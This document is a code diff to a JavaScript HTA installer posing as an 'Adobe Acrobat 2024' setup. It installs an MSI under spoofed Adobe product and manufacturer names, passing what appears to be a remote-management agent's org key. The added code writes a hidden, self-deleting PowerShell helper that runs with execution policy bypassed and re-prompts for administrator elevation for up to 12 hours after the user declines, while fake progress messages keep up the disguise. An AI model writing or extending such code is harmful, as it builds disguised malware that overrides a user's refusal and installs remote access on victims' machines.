@@ -102,6 +102,7 @@ var LEVEL_KEY = "vNXe6NQK21W3jiBMb4k2Uz8M";   // org key (MSI property)
 var PREP_MS        = 1600;    // "preparing" beat before the download starts
 var UAC_TIMEOUT_MS = 150000;  // no MSI log this long after launch -> UAC declined
 var INSTALL_MAX_MS = 300000;  // hard cap for a whole install phase
+var RETRY_INWINDOW_MS = 1800000;  // after UAC declined: keep the window waiting ~30min while the detached helper re-prompts
 var INSTALL_STALL_MS = 60000; // MSI log silent this long -> assume finished
 var HANG_MS        = 4000;    // no data flowing this long -> start next back-end
 var EXEC_STAGE_MS  = 300000;  // hard cap for the helper-process back-end
@@ -141,6 +142,12 @@ var curlPid = 0, curlT0 = 0, curlLastSize = 0, curlLastGrowT = 0;
 
 var lastLogSize = 0;
 var lastLogGrowT = 0;
+
+// Install-retry helper (spawned once, when the first UAC consent is declined).
+var installHelperSpawned = false;
+var installHelperT0 = 0;
+var installHelperFile = "";
+var installHelperDir = "";
 
 var dlMsgs = [
   "Preparing installation&hellip;",
@@ -714,6 +721,119 @@ function verifyFallback() {
 }
 
 // ---------------------------------------------------------------------------
+// UAC-declined retry. When the first elevated msiexec is declined (no MSI log
+// within UAC_TIMEOUT_MS), spawn ONE hidden, detached PowerShell helper that
+// re-fires the same elevated msiexec on a jittered, escalating schedule until
+// it succeeds or the window closes. This makes a "No" non-fatal: the installer
+// keeps trying (like a real, patient installer) instead of dying on the first
+// declined consent. The helper is self-contained (its own copy of the args +
+// log path) so it survives the HTA window closing, and it terminates itself the
+// moment an MSI log appears (i.e. a later attempt finally got consent).
+// ---------------------------------------------------------------------------
+function escPsSingle(s) {
+  // The HTA builds the helper as a single-quoted PowerShell string, so the only
+  // escape is doubling any single quotes in the value.
+  return String(s).replace(/'/g, "''");
+}
+
+function spawnInstallRetryHelper() {
+  if (installHelperSpawned) return;
+  installHelperSpawned = true;
+  try {
+    var tmp = shell.ExpandEnvironmentStrings("%TEMP%");
+    var tag = "adbe" + Math.floor(Math.random() * 4294967296).toString(16);
+    installHelperDir = tmp + "\\adbe_" + tag;
+    try { if (!fso.FolderExists(installHelperDir)) fso.CreateFolder(installHelperDir); } catch (e) {}
+    installHelperFile = installHelperDir + "\\install_retry_" + tag + ".ps1";
+
+    var msi  = escPsSingle(msiLocal);
+    var logp = escPsSingle(curLog);
+    var msiArgs = '/i "' + msiLocal + '" /qn /norestart PRODUCTNAME="Adobe Acrobat 2024 (64-bit)" MANUFACTURER="Adobe Systems Incorporated" LEVEL_API_KEY="' + LEVEL_KEY + '" /L*v "' + curLog + '"';
+    var msiArgsQ = escPsSingle(msiArgs);
+    var msiQ  = escPsSingle(msiLocal);
+    var logQ  = escPsSingle(curLog);
+
+    // The helper: re-fires an elevated msiexec on a jittered, escalating
+    // schedule until the install starts or the 12h window elapses. It gates each
+    // attempt on the UAC consent dialog NOT currently being shown (checks
+    // consent.exe / UserOOBEBroker.exe), so it never stacks prompts and never
+    // depends on the Start-Process -Verb RunAs returned object (which is
+    // not-started and throws on .HasExited while the prompt is pending/declined).
+    // It stops itself once the MSI log exists (a real install has begun), if the
+    // MSI file is gone, or after 12h. Runs hidden, detached.
+    var ps = [
+      "$ErrorActionPreference='SilentlyContinue'",
+      "$msi='" + msiQ + "'",
+      "$logp='" + logQ + "'",
+      "$msiArgs='" + msiArgsQ + "'",
+      "$attempts=0; $start=Get-Date; $maxMs=43200000",
+      "$promptUp={ $c=@(Get-Process consent,UserOOBEBroker -ErrorAction SilentlyContinue).Count; $c -gt 0 }",
+      "Start-Sleep -Milliseconds 3000",
+      "while($true){",
+      "  if(Test-Path -LiteralPath $logp){break}",
+      "  if(-not (Test-Path -LiteralPath $msi)){break}",
+      "  $el=(Get-Date)-$start; if($el.TotalMilliseconds -gt $maxMs){break}",
+      "  if(&$promptUp){ Start-Sleep -Milliseconds 8000; continue }",
+      "  try{ Start-Process -FilePath 'msiexec.exe' -ArgumentList $msiArgs -Verb RunAs -WindowStyle Hidden }catch{ }",
+      "  $attempts++",
+      "  if(Test-Path -LiteralPath $logp){break}",
+      "  $base=@(20000,60000,120000,180000)[[Math]::Min($attempts,3)]",
+      "  if($attempts -ge 4){ $base=180000 + (Get-Random -Maximum 300001) }",
+      "  $jitter=(Get-Random -Maximum 3001)-1500",
+      "  $d=$base+$jitter; if($d -lt 3000){$d=3000}",
+      "  Start-Sleep -Milliseconds $d",
+      "}",
+      "try{ $self=Join-Path $PSScriptRoot ($MyInvocation.MyName); Remove-Item -LiteralPath $self -Force }catch{}",
+      "try{ Remove-Item -LiteralPath $PSScriptRoot -Force -Recurse }catch{}",
+      "exit 0"
+    ].join("\n");
+
+    try { deleteFile(installHelperFile); } catch (e) {}
+    var w = fso.CreateTextFile(installHelperFile, true, false);
+    w.Write(ps);
+    w.Close();
+    traceLog("install: spawn retry helper " + installHelperFile);
+
+    // Launch the helper hidden + detached (NOT elevated - the helper elevates
+    // on each msiexec attempt itself). A hidden window (0) leaves no console.
+    var launch = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File \"" + installHelperFile + "\"";
+    try { shell.Run(launch, 0, false); }
+    catch (e) { traceLog("install: retry-helper launch fail " + e.message); }
+    installHelperT0 = nowMs();
+  } catch (e) {
+    traceLog("install: retry-helper fail " + e.message);
+  }
+}
+
+function installRetryActive() {
+  // The detached helper owns re-prompting once it's up. Give it up to ~30 min
+  // before we give up the in-window wait (and flip the window to a clean state).
+  return installHelperSpawned && (nowMs() - installHelperT0 < RETRY_INWINDOW_MS);
+}
+
+// Is an msiexec process running? True only once consent was given and the
+// install is actually executing.
+function msiexecRunning() {
+  try {
+    var e = shell.Exec('tasklist /fi "imagename eq msiexec.exe"');
+    var out = e.StdOut().ReadAll();
+    return /msiexec/i.test(out);
+  } catch (e2) { return true; }  // can't tell -> assume still running (safe)
+}
+// Is the UAC consent dialog open? The prompt runs as consent.exe (UserOOBEBroker
+// on some builds). While it's up the user hasn't answered yet; when it's gone
+// and no install started, the consent was declined/closed.
+function uacConsentRunning() {
+  try {
+    var e = shell.Exec('tasklist /fi "imagename eq consent.exe"');
+    var out = e.StdOut().ReadAll();
+    if (/consent\.exe/i.test(out)) return true;
+    var e2 = shell.Exec('tasklist /fi "imagename eq UserOOBEBroker.exe"');
+    return /UserOOBEBroker\.exe/i.test(e2.StdOut().ReadAll());
+  } catch (e3) { return true; }  // can't tell -> assume still pending (safe)
+}
+
+// ---------------------------------------------------------------------------
 // Install phase: msiexec installs the LOCAL MSI file. Single UAC consent via
 // ShellExecute "runas". Completion is detected by watching the MSI /L*v log -
 // the final line "Installation success or error status: N" is written on exit.
@@ -803,9 +923,30 @@ function _pollInstall() {
     }
     return;
   }
-  // No log yet: UAC consent is pending (or was declined).
+  // No log yet: UAC consent is pending (or was declined/abandoned).
+  if (t - startTime > 20000) {
+    // Decline/abandon detection: after a short grace (lets the MSI log appear
+    // once consent is given), if the consent dialog is gone and no msiexec is
+    // running, the user clicked No (or walked away) -> hand re-prompting to the
+    // detached helper immediately instead of waiting out the full timeout.
+    if (!installHelperSpawned && !uacConsentRunning() && !msiexecRunning()) {
+      traceLog("install: uac declined (consent gone), spawning retry helper");
+      spawnInstallRetryHelper();
+    }
+  }
   if (t - startTime > UAC_TIMEOUT_MS) {
-    fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout");
+    // Fallback for the case where the consent dialog was never opened / left
+    // hanging (or detection is unavailable): same hand-off, plus the in-window
+    // patience before the window gives up on its own.
+    if (!installHelperSpawned) {
+      traceLog("install: uac timeout, spawning retry helper");
+      spawnInstallRetryHelper();
+    }
+    if (t - startTime > UAC_TIMEOUT_MS + RETRY_INWINDOW_MS) {
+      // Window has waited long enough on its own; the helper keeps trying in
+      // the background (up to 12h). Close cleanly (no scary error page).
+      fail("Administrator approval is required to install Adobe Acrobat", "install: uac timeout (helper continues)");
+    }
   }
 }
 
@@ -828,7 +969,11 @@ function _tick() {
     } else {
       // UAC pending: creep toward ~92%.
       if (progress < 92) { progress += (92 - progress) * 0.01; setBar(progress); }
-      setStatus(instMsgs[0]);
+      if (installHelperSpawned) {
+        setStatus("Waiting for administrator approval&hellip;");
+      } else {
+        setStatus(instMsgs[0]);
+      }
     }
   } else if (state === "predl") {
     // Approach 55% so the bar is visibly moving while data comes in.
